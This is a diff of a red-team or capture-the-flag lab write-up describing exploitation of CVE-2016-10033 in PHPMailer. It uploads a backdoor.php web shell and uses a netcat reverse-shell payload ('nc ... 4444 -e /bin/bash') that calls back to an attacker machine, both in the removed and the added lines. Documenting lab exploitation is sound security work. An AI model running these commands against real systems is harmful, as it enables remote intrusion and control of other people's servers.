@@ -57,29 +57,30 @@ The Red Team was able to penetrate Target 2 and retrieve the following confident
 
 ---
 
-**CVE-2016-10033** Remote Code Execution Vulnerability in PHPMailer
+- **CVE-2016-10033** Remote Code Execution Vulnerability in PHPMailer
 
-    The current version of PHPMailer in use (5.2.16) is vulnerable. It allows extra parameters in the mail command and consequently executes arbitrary code. Therefore, the exploited machine can establish stealthy communication with a threat actor through a reverse shell that will bypass the inbound rules of a firewall.
+    The current version of PHPMailer in use (5.2.16) is vulnerable. It allows extra parameters in the mail command and consequently executes arbitrary code. Therefore, the exploited machine can establish stealthy communication with a Command and Control through a reverse shell that will bypass the inbound rules of a firewall.
 
+    1. Execution of the script to exploit PHPMailer. This script will upload a file called backdoor.php to the target server allowing the execution of command injection attacks.
 
-    ![7](/Images/4/7.PNG)  
+            ./exploit.sh
 
-    4. `searchsploit phpmailer`
+        ![15](/Images/4/15.PNG)
 
-     ![8](/Images/4/8.PNG)  
+    2. Set the Command and Control Machine to listen using the NetCat command.
 
-    4. `sudo chmod 777 exploit.sh`
+            nc -lnvp 4444
 
-    5. `./exploit.sh`
+        ![16](/Images/4/16.PNG)
 
-    6. In kali: `nc -lnvp 4444`
+    19. Make that the exploited machine calls to the Command and Control Machine using a NetCat command embedded in a payload after running the payload in the browser.
 
-    7. `192.168.1.115/backdoor.php?cmd=nc 192.168.1.90 4444 -e /bin/bash`
+            192.168.1.115/backdoor.php?cmd=nc 192.168.1.101 4444 -e /bin/bash  
 
-    ![14](/Images/1/14.png)
+        ![17](/Images/4/17.PNG)
 
-    8. `Find /var/www -type f -name .flag*’`
+    20. Sensitive information was found in the "www" and "WordPress uploads" directory    
 
-    9. Go to browser and put `http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png`
+        ![18](/Images/4/18.PNG)
 
-    ![15](/Images/1/15.png)
+        ![15](/Images/1/15.png)
